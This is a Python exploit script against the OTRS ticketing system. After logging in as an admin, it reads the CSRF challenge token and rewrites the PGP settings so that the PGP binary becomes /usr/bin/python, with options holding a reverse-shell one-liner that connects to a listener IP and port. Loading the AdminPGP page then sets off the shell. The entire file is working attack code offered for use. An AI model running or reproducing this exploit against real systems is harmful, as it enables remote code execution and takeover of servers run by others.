import requests
import argparse

def exploit(baseuri, username, password, rev_shell_ip, rev_shell_port):
    sess = requests.Session()
    print("[+] Attemping to login with {username}:{password}".format(username=username,password=password))
    data = {"Action":"Login","RequestedURL":"","Lang":"en","TimeOffset":"-480","User":username,"Password":password};
    sess.post(baseuri,data=data)
    if "OTRSAgentInterface" in sess.cookies.get_dict():
        print("[+] Successfully logged into {baseuri}".format(baseuri=baseuri))
        print("[+] Obtained Auth Token: {token}".format(token=sess.cookies.get_dict()["OTRSAgentInterface"]))
    else:
        print("[+] Login unsuccessful! Invalid Credentials!")
        return
    contents = sess.get(baseuri+"?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework").text
    challTokenStart = contents.find('<input type="hidden" name="ChallengeToken" value="')+50
    challengeToken = contents[challTokenStart:challTokenStart+32]
    print("[+] Obtained challenge token from PGP panel: {token}".format(token=challengeToken))
    print("[+] Creating reverse shell payload..")
    settings = {\
        "ChallengeToken":challengeToken,\
        "Action":"AdminSysConfig",\
        "Subaction":"Update",\
        "SysConfigGroup":"Framework",\
        "SysConfigSubGroup":"Crypt::PGP",\
        "DontWriteDefault":"1",\
        "PGP":"1",\
        "PGP::Bin":"/usr/bin/python",\
        "PGP::Options":"-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + rev_shell_ip + "\"," + str(rev_shell_port) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",\
        "PGP::Key::PasswordKey[]":"488A0B8F",\
        "PGP::Key::PasswordContent[]":"SomePassword",\
        "PGP::Key::PasswordDeleteNumber[]":"1",\
        "PGP::Key::PasswordKey[]":"D2DF79FA",\
        "PGP::Key::PasswordContent[]":"SomePassword",\
        "PGP::Key::PasswordDeleteNumber[]":"2",\
        "PGP::TrustedNetworkItemActive":"1",\
        "PGP::TrustedNetwork":"0",\
        "PGP::LogKey[]":"BADSIG",\
        "PGP::LogContent[]":"The+PGP+signature+with+the+keyid+has+not+been+verified+successfully.",\
        "PGP::LogDeleteNumber[]":"1",\
        "PGP::LogKey[]":"ERRSIG",\
        "PGP::LogContent[]":"It+was+not+possible+to+check+the+PGP+signature%2C+this+may+be+caused+by+a+missing+public+key+or+an+unsupported+algorithm.",\
        "PGP::LogDeleteNumber[]":"2",\
        "PGP::LogKey[]":"EXPKEYSIG",\
        "PGP::LogContent[]":"The+PGP+signature+was+made+by+an+expired+key.",\
        "PGP::LogDeleteNumber[]":"3",\
        "PGP::LogKey[]":"GOODSIG",\
        "PGP::LogContent[]":"Good+PGP+signature.",\
        "PGP::LogDeleteNumber[]":"4",\
        "PGP::LogKey[]":"KEYREVOKED",\
        "PGP::LogContent[]":"The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.",\
        "PGP::LogDeleteNumber[]":"5",\
        "PGP::LogKey[]":"NODATA",\
        "PGP::LogContent[]":"No+valid+OpenPGP+data+found.",\
        "PGP::LogDeleteNumber[]":"6",\
        "PGP::LogKey[]":"NO_PUBKEY",\
        "PGP::LogContent[]":"No+public+key+found.",\
        "PGP::LogDeleteNumber[]":"7",\
        "PGP::LogKey[]":"REVKEYSIG",\
        "PGP::LogContent[]":"The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.",\
        "PGP::LogDeleteNumber[]":"8",\
        "PGP::LogKey[]":"SIGEXPIRED",\
        "PGP::LogContent[]":"The+PGP+signature+is+expired.",\
        "PGP::LogDeleteNumber[]":"9",\
        "PGP::LogKey[]":"SIG_ID",\
        "PGP::LogContent[]":"Signature+data.",\
        "PGP::LogDeleteNumber[]":"10",\
        "PGP::LogKey[]":"TRUST_UNDEFINED",\
        "PGP::LogContent[]":"This+key+is+not+certified+with+a+trusted+signature%21.",\
        "PGP::LogDeleteNumber[]":"11",\
        "PGP::LogKey[]":"VALIDSIG",\
        "PGP::LogContent[]":"The+PGP+signature+with+the+keyid+is+good.",\
        "PGP::LogDeleteNumber[]":"12",\
        "PGP::StoreDecryptedData":"1"\
    };
    sess.post(baseuri+"?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework",data=settings)
    print("[+] Trigerring reverse shell connection...")
    sess.get(baseuri+"?Action=AdminPGP")
    print("[+] Exploit completed, check your listener for a shell")
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help = 'Base url (e.g. http://10.10.10.10/otrs/index.pl)')
    parser.add_argument('--username', help = 'Username used to login (default username: root@localhost)')
    parser.add_argument('--password', help = 'Password used to login (default password: root)')
    parser.add_argument('--ip', help = 'IP of local listener')
    parser.add_argument('--port', help = 'Port of local listener')
    args = parser.parse_args()
    exploit(args.url, args.username, args.password, args.ip, args.port)
